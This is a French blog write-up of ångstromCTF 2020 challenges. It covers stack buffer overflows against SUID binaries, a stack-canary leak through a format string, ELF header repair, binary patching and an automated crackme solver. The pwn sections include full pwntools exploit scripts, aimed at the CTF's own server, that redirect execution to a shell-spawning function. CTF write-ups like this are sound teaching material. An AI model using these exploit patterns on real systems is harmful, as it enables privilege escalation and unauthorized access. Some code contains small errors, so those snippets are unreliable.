---
layout: post
title: ångstromCTF 2020
categories: CTF
---

![devoops-E](/img/Angstrom2020/banner.PNG){:class="img-responsive"}

### Sommaire

* No_Canary (_Pwn - 50 points_)
* Canary (_Pwn - 70 points_)
* Revving Up (_Reverse - 50 points_)
* Windows_of_Opportunity (_Reverse - 50 points_)
* Taking_Off (_Reverse - 70 points_)
* Patcherman (_Reverse - 100 points_)
* Autorev, Assemble! (_Reverse - 125 points_)

### No_Canary (Pwn - 50 points)
Ce premier challenge de la catégorie Pwn est très explicite, puisque le titre du challenge indique qu'il s'agira d'un exploitation sans [stack-canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow), d'un simple buffer overflow.
Une vérification des sécurités du binaire confirme la théorie, il s'agit d'un BufferOverflow classique, sans aucune protection:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary0.png){:class="img-responsive"}

Le binaire possède le bit SUID et exécute des instructions avec un compte privilégié:

L'objectif est ici d'appeler la fonction '_flag_', en détournant le flow d'exécution du programme.
Cette fonction ouvre un shell sur la machine:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary2.png){:class="img-responsive"}

Avec la présence du bit SUID, ce sera donc un shell root !

L'exécution du programme nous montre son fonctionnement:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary1.png){:class="img-responsive"}

Notre chaine de caractères est récupérée via la fonction _gets_, qui est vulnérable aux buffer overflows, parfait !

![devoops-E](/img/Angstrom2020/No_Canary/ncanary4.png){:class="img-responsive"}

Bien évidemment, le binaire est en segfault lorsque la chaine entrée est trop longue.

![devoops-E](/img/Angstrom2020/No_Canary/ncanary5.png){:class="img-responsive"}

Essayons de déterminer à partir de combien de bytes la valeur du pointeur d'instruction RIP est écrasée par notre chaine.
Pour ce faire, j'utilise ici une suite de DeBruijn, génerée avec l'outil _cyclic_ de la librairie python _PwnTools_:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary6.png){:class="img-responsive"}

Un petit break sur la fonction _ret_ et un affichage de la stack nous permet de déterminer l'offset à partir duquel notre input écrase le registre RIP. 

![devoops-E](/img/Angstrom2020/No_Canary/ncanary7.png){:class="img-responsive"}

Attention, Le binaire est en 64 bits, donc il faudra tronquer l'offset de RIP à 4 bytes et soustraire 4 bytes du résultat final:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary8.png){:class="img-responsive"}

Le padding est donc de 40 bytes.

Il ne reste qu'a récupérer l'adresse de la fonction '_flag_', et le tour est joué:

![devoops-E](/img/Angstrom2020/No_Canary/ncanary9.png){:class="img-responsive"}

L'exploit correspondant est le suivant:
```python
from pwn import *
conn = remote("shell.actf.co" 20700)
pad = "A" * 40
flag_func = "\x86\x11\x40\x00\x00\x00\x00\x00"
payload = pad + flag_func
conn.sendline(payload)
conn.interactive()
```
Enfin, l'exécution nous ouvre un shell sur le serveur distant, afin de récupérer le flag:
```bash
actf{that_gosh_darn_canary_got_me_pwned!}
```

### Canary (Pwn - 70 points)
Il semblerait que ce challenge soit identique au précédent, mais avec un stack-canary ajouté:

![devoops-E](/img/Angstrom2020/Canary/canary0.png){:class="img-responsive"}

Puisque le binaire est en 64 bits, il est impossible de le bruteforce entièrement.
Il ne reste que deux options: un bruteforce partiel du canary avec un leak partiel, ou un leak complet.

En lançant le programme pour déterminer son fonctionnement, on remarque que cette fois-ci, le programme récupère deux inputs utilisateur et possède bien un stack-canary:

![devoops-E](/img/Angstrom2020/Canary/canary1.png){:class="img-responsive"}

Tout semble setup pour un leak, essayons une format-string:

![devoops-E](/img/Angstrom2020/Canary/canary2.png){:class="img-responsive"}

C'est parfait !

Trouvons le canary parmi ce leak. 
Le canary est vérifiée en fin d'exécution du programme, ce qui permet de comparer la valeur avec le leak précédemment obtenu.
Le canary est ici stocké dans le registre RAX:

![devoops-E](/img/Angstrom2020/Canary/canary3.png){:class="img-responsive"}

Et celui-ci correspond bien à la 17ème adresses du leak mémoire.

L'idée est donc de récupérer dynamiquement le canary via la première entrée utilisateur, avant de déclencher un buffer-overflow (toujours sur la fonction _gets_), de façon à écraser l'adresse à laquelle le programme va return, tout en re-plaçant le canary à la bonne place.

La partie de l'exploit permettant de récupérer le canary est la suivante:
```python
from pwn import *
conn = remote("shell.actf.co" 20701)

f_string = "%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx"

conn.sendline(f_string)
leak = conn.recvuntil("Anything")
canary = str(leak).split("nice to meet you, ")[1].split("!")[0].split("-")[-1]
print("[+] Canary found: " + canary)
```

Il nous manque maintenant le padding nécessaire pour écraser le canary, et celui pour écraser RIP.

Pour trouver l'offset du cannary, il suffit d'observer l'état de la stack, connaissant la valeur du cannary (ce qui est maintenant le cas):

![devoops-E](/img/Angstrom2020/Canary/canary4.png){:class="img-responsive"}

La cannary est donc à 7*8 = 56 bytes.

Afin de s'assurer que tout fonctionne bien, essayons de causer un overflow sans toucher au canary:
```python
from pwn import *
conn = remote("shell.actf.co" 20701)

pad = "A" * 56
f_string = "%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx"

conn.sendline(f_string)
leak = conn.recvuntil("Anything")
canary = str(leak).split("nice to meet you, ")[1].split("!")[0].split("-")[-1]
print("[+] Canary found: " + canary)
canary_little_indian = p64(int(canary, 16))
payload = pad + canary

conn.sendline(payload)
conn.interactive()
```

Parfais, le programme segfault en outrepassant le canary:

![devoops-E](/img/Angstrom2020/Canary/canary5.png){:class="img-responsive"}

En observant l'état de la stack, il manque 8 bytes à notre payload : les 8 bytes servant d'adresse de retours lorsque la fonction permettant d'obtenir le flag retournera au main. Cette adresse n'a pas besoin d'exister, le programme se fermera avec un segfault, mais ce ne sera plus notre problème.

Enfin, les 8 bytes suivants vont écraser le contenu du registre RIP, et nous permettre de rediriger le code vers la fonction_flag_.

Cette fonction est située à l'adresse 0x0000000000407087:

![devoops-E](/img/Angstrom2020/Canary/canary6.png){:class="img-responsive"}

L'exploit final peut désormais être écrit:
```python
from pwn import *
conn = remote("shell.actf.co" 20701)

pad = "A" * 56
f_string = "%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx"
payload = ""

conn.sendline(f_string)
leak = conn.recvuntil("Anything")
canary = str(leak).split("nice to meet you, ")[1].split("!")[0].split("-")[-1]
print("[+] Canary found: " + canary)
canary_little_indian = p64(int(canary, 16))
junk = "BBBBBBBB"
flag_func = "\x87\x07\x40\x00\x00\x00\x00\x00"

payload += pad
payload += canary_little_indian
payload += junk
payload += flag_func

conn.sendline(payload)
conn.interactive()
```

A l'exécution, notre belle fonction apparait, permettant de récupérer le flag:

![devoops-E](/img/Angstrom2020/Canary/canary7.png){:class="img-responsive"}

```bash
actf{youre_a_canary_killer_>:(}
```
### Revving Up (_Reverse - 50 points_)
Premier binaire de la catégorie qui sert de sanity check plus qu'autre chose.
Une simple vérification des chaines de caractères présentes en clair révèle les deux étapes à suivre pour obtenir le flag:

![devoops-E](/img/Angstrom2020/Revv/revv0.png){:class="img-responsive"}

Le binaire étant si anecdotique que je n'ai pas pris le temps de récupérer une trace du flag pour l'écriture de ce writeup :

![devoops-E](/img/Angstrom2020/Revv/revv1.png){:class="img-responsive"}

### Windows_of_Opportunity (_Reverse - 50 points_)
Deuxième challenge très simple de ce CTF, il s'agit ici d'un simple exécutable Windows sans aucune protection ni-obfuscation, qui offre 50 points gratuits ...

![devoops-E](/img/Angstrom2020/win/win0.png){:class="img-responsive"}

### Taking_Off (_Reverse - 70 points_)

![devoops-E](/img/Angstrom2020/takking_off/tak7.png){:class="img-responsive"}

Le but semble ici de déterminer quel est la bonne suite d'arguments à passer au binaire pour que celui-ci nous révèle le flag:

![devoops-E](/img/Angstrom2020/takking_off/tak1.png){:class="img-responsive"}

La correspondance entre la position des arguments et les variables données par IDA est présente dans l'en-tête de la fonction main:

![devoops-E](/img/Angstrom2020/takking_off/tak0.png){:class="img-responsive"}

Après avoir vérifié que les 3 premiers arguments sont des valeurs numériques, le bloc conditionnel suivant est exécuté:

![devoops-E](/img/Angstrom2020/takking_off/tak2.png){:class="img-responsive"}

Le deuxième argument est ici multiplié par 100:
```python
mov     eax, [rbp+var_A8]
imul    ecx, eax, 0x64
```
Le premier est shifté vers la gauche par 2 (donc multiplié par 10) :
```python
mov     edx, [rbp+var_AC]
mov     eax, edx
shl     eax, 0x2
```
Les deux résultats sont additionnés entre eux, avant d'être additionnés avec le troisième argument.
Enfin, cette somme est comparée à la valeur 939:
```python
cpm     eax, 0x3A4
```
Il faut donc résoudre l'équation suivante pour passer cette portion de code:
```bash
arg_2 * 100 + arg_1 * 10 + arg_3 = 939
arg_1 = 9
arg_2 = 3
arg_3 = 2
```

Mais ce n'est pas tout, le quatrième argument doit être égal à la chaine en clair '_chicken_':

![devoops-E](/img/Angstrom2020/takking_off/tak3.png){:class="img-responsive"}

Enfin, pour terminer, le binaire demande un mot de passe:

![devoops-E](/img/Angstrom2020/takking_off/tak4.png){:class="img-responsive"}

Ce mot de passe est obfusqué avec une chaine qui à été xorée avec la valeur 42 (base 10).
Cette chaine est la suivante:

![devoops-E](/img/Angstrom2020/takking_off/tak5.png){:class="img-responsive"}

Une fois le xor caractères par caractères effectués, le mot de passe s'avère être: _please give flag_ ! --'.

![devoops-E](/img/Angstrom2020/takking_off/tak6.png){:class="img-responsive"}

Et voilà:
```bash
actf{th3y_gr0w_up_s0_f4st}
```

### Patcherman (_Reverse - 100 points_)
![devoops-E](/img/Angstrom2020/patch/path_001.png){:class="img-responsive"}

Pour ce challenge, nous sommes en présence d'un exécutable linux malformé:
```ctf
Oh no! We were gonna make this an easy challenge where you just had to run the binary and it gave you the flag, but then clam came along under the name of "The Patcherman" and edited the binary! I think he also touched some bytes in the header to throw off disassemblers.
```

Ok, commençons par récupérer des informations sur le header:
```bash
[homardboy@Arch Patherman]# readelf -h patcherman
ELF Header
[...]
readelf: Warning: Section 1 has an out of range sh_link value of 504
readelf: Warning: Section 4 has an out of range sh_link value of 3616
readelf: Warning: Section 5 has an out of range sh_link value of 4194900
readelf: Warning: Section 6 has an out of range sh_link value of 4196624
readelf: Warning: Section 8 has an out of range sh_link value of 496
readelf: Warning: Section 13 has an out of range sh_link value of 44
readelf: Warning: Section 14 has an out of range sh_link value of 1970274412
readelf: Warning: Section 15 has an out of range sh_link value of 1600061493
readelf: Warning: Section 15 has an out of range sh_info value of 1852796263
readelf: Warning: Section 16 has an out of range sh_link value of 70
readelf: Warning: Section 18 has an out of range sh_link value of 6295592
readelf: Warning: Section 20 has an out of range sh_link value of 3909091328
readelf: Warning: Section 21 has an out of range sh_link value of 3909091328
readelf: Warning: Section 22 has an out of range sh_info value of 4202255
readelf: Warning: Section 23 has an out of range sh_link value of 1611694318
readelf: Warning: Section 23 has an out of range sh_info value of 3850979328
readelf: Warning: Section 24 has an out of range sh_link value of 2303218967
readelf: Warning: Section 24 has an out of range sh_info value of 4286507237
readelf: Warning: Section 25 has an out of range sh_link value of 2314916801
readelf: Warning: Section 26 has an out of range sh_link value of 245248
readelf: Warning: Section 26 has an out of range sh_info value of 3347644416
readelf: Warning: Section 27 has an out of range sh_link value of 3490250784
readelf: Warning: Section 27 has an out of range sh_info value of 163186057
readelf: Warning: Section 28 has an out of range sh_info value of 190
readelf: Error: Reading 13402712491066720288 bytes extends past end of file for string table
readelf: Error: Section 1 has invalid sh_entsize of 0000000400000003
readelf: Error: (Using the expected size of 24 for the rest of this dump)
readelf: Error: Section 8 has invalid sh_entsize of 6c2f343662696c2f
readelf: Error: (Using the expected size of 24 for the rest of this dump)
readelf: Error: no .dynamic section in the dynamic segment
```

Le problème semble venir des sections du binaire.

En se renseignant sur la composition d'un header ELF, et puisque toutes les sections de binaire semblent corrompues, il est fort probable que la valeur de la "_section header table address_" (offset 30) soit simplement invalide.

Pour en être sûr, il s'uffit de comparer un header valide avec le nôtre (j'utilise ici le binaire fournis avec le challenge précédent):
```asm
[root@Arch Patcherman]# xxd ../Taking_Off/taking_off | head -20
7f45 4c46 0201 0100 0000 0000 0000 0000 (elf header)
02 00 (e_type)
3e 00 (e_machine)
01 00  (e_version)
00 00 90 07 40 00 00 00 (entrypoint)
00 00 40 00 00 00 00 00 (e_phoff)
00 00 00 2c 00 00 00 00 (section header table address)
```

En observant le binaire patcherman, le résultat saute aux yeux: l'adresse indiquant la table des sections à été remplacée avec des zéros:
```asm
[root@Arch Patcherman]# xxd patcherman | head -20
7f45 4c46 0201 0100 0000 0000 0000 0000 (elf header)
02 00 (e_type)
3e 00 (e_machine)
01 00 (e_version)
00 00 70 05 40 00 00 00 (entrypoint)
00 00 40 00 00 00 00 00 (e_phoff)
00 00 00 00 00 00 00 00 (section header table address)
```

Mais comment savoir vers quelle adresse cette valeur du header doit pointer ?
Après quelques recherches, il semblerait que celle-ci soit physiquement située juste après l'espace contenant le nom des sections.
En vérifiant où pointe cette adresse sur un binaire valide, nous retrouvons bien le nom des sections juste au dessus:
```asm
[root@Arch Patcherman]# xxd../Taking_Off/taking_off
[...]
00002b90: 7874 002e 6669 6e69 002e 726f 6461 7461  xt..fini..rodata
00002ba0: 002e 6568 5f66 7261 6d65 5f68 6472 002e  ..eh_frame_hdr..
00002bb0: 6568 5f66 7261 6d65 002e 696e 6974 5f61  eh_frame..init_a
00002bc0: 7272 6179 002e 6669 6e69 5f61 7272 6179  rray..fini_array
00002bd0: 002e 6479 6e61 6d69 6300 2e67 6f74 002e  ..dynamic..got..
00002be0: 676f 742e 706c 7400 2e64 6174 6100 2e62  got.plt..data..b
00002bf0: 7373 002e 636f 6d6d 656e 7400 0000 0000  ss..comment.....
00002c00: 0000 0000 0000 0000 0000 0000 0000 0000  ................ <- ici
00002c10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00002c20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```
Ce qui permet de déterminer où va devoir pointer celle du challenge:
```asm
[root@Arch Patcherman]# xxd../Taking_Off/taking_off
[...]
00001a90: 6578 7400 2e66 696e 6900 2e72 6f64 6174  ext..fini..rodat
00001aa0: 6100 2e65 685f 6672 616d 655f 6864 7200  a..eh_frame_hdr.
00001ab0: 2e65 685f 6672 616d 6500 2e69 6e69 745f  .eh_frame..init_
00001ac0: 6172 7261 7900 2e66 696e 695f 6172 7261  array..fini_arra
00001ad0: 7900 2e64 796e 616d 6963 002e 676f 7400  y..dynamic..got.
00001ae0: 2e67 6f74 2e70 6c74 002e 6461 7461 002e  .got.plt..data..
00001af0: 6273 7300 2e63 6f6d 6d65 6e74 0000 0000  bss..comment....
00001b00: 0000 0000 0000 0000 0000 0000 0000 0000  ................ <- ici
00001b10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001b20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001b30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```
A l'adresse _0x00001b00_ !

Après modification du binaire avec un éditeur hexadécimal, la première partie du challenge est résolue.
Nous pouvons désormais ouvrir le programme dans un désassembleur.

Pour atteindre le flag, il sera nécessaire de patcher quelques variables à la main.
Une comparaison est faite entre une variable stockée quelque part dans le binaire est _0x1337BEEF_ :

![devoops-E](/img/Angstrom2020/patch/pat0.png){:class="img-responsive"}

Cette variable ne correpsondant pas, il faudra la patcher:

![devoops-E](/img/Angstrom2020/patch/pat2.png){:class="img-responsive"}

Puisque le patern est reconnaissable, il suffira de chercher l'offset de la variable via la commande
```asm
[root@Arch Patcherman]# xxd patcherman | grep beba
00001050: beba 0df0 ff00 0000 0000 0000 0000 0000  ................
```
Toujours avec un éditeur héxadécimal, cet offset peut être remplacé par _0xEFBE3713_ (version little-indian de _0x1337BEEF_).

Et voilà, le binaire est patché, et nous offre gracieusement le flag:
```asm
[root@Arch Patcherman]# ./patcherman
Here have a flag:
actf{p4tch3rm4n_15_n0_m0r3}
```

### Autorev, Assemble! (_Reverse - 125 points_)
![devoops-E](/img/Angstrom2020/win/auto_00.png){:class="img-responsive"}

Le but est ici d'automatiser la résolution du crackme.
Le code suivant résume toutes les opérations à effectuer et le mindset avec lequel j'ai résolu ce challenge:

```python
import os 
import sys
import time

def print_flag(flag):
    flag_disp = ""
    for letters in flag:
        flag_disp += letters
    print("Flag: " + flag_disp, end='\r'),

def extract_func(func_name, disass):
    separator = "<" + str(func_name) + ">"
    content = str(disass).split(separator)[1].split("\n\n")[0]
    return content

def resolve_equa(func_content, func_name, flag):
    nb_lines = str(func_content).count("\n")
    for x in range(0, nb_lines):
        line = str(func_content).split("\n")
        
        #Get the cmp value
        if "cmp" in str(line[x]):
            cmp_value = chr(int(str(line[x]).split("$")[1].split(",")[0], 16))

    # Get the operator and the operande value
    op_line = line[5]
    
    if "add" in op_line:
        # Equation POV, if the function is adding something, we need to performe a minus.
        operator = "-"
        value = int(str(op_line).split("$")[1].split(",")[0], 16)
#        print("Function <" + str(func_name) + "> Char " + str(value) + " = " + str(cmp_value))
        flag[int(str(value), 10)] = str(cmp_value)
        print_flag(flag)
    elif "sub" in op_line:
        # Idem, if it' a '-', we need to add something to resolve it
        operator = "+"
        value = str(op_line).split("$")[1].split(",")[0]
    else:
        # Just here to fuck with the script, thanks !
        operator = "movzbl"
        value = "NA"

    #exit(1)

    return flag

disassemble_cmd = "objdump -M Intel -tS autorev_assemble"
disass = os.popen(disassemble_cmd).read()
nb_call = 0
flag = ["*"]*200

print_flag(flag)

# Disassemble main function
main = extract_func("main", disass)

#Get each separated main instructions
for main_op in main.split("\n"):

    # Only keep the call xxx instruction, and remove call from the PLT
    if "call" in main_op and "@" not in main_op:

        # Extract function's name
        func_name = str(main_op).split("<")[1].split(">")[0]
        
        # Extract function's instructions from it's name
        func_content = extract_func(func_name, disass)
        
        # Break it
        flag = resolve_equa(func_content, func_name, flag)

        nb_call += 1
# Small cheat, i guess the two missing letters
flag[0] = "b"
flag[128] = "_"
print("[+] Found a total of " + str(nb_call) + " functions to reverse")
a = print_flag(flag)
print(a)
```

Et le moment tant attendu:
```asm
[root@Arch Patcherman]# ./auto_reverse.py
[+] Found a total of 200 functions to reverse
Flag: blockchain big data solutions now with added machine learning. Enjoy! I sincerely hope you actf{wr0t3_4_pr0gr4m_t0_h3lp_y0u_w1th_th1s_df93171eb49e21a3a436e186bc68a5b2d8Noneinstead of doing it by hand.
```
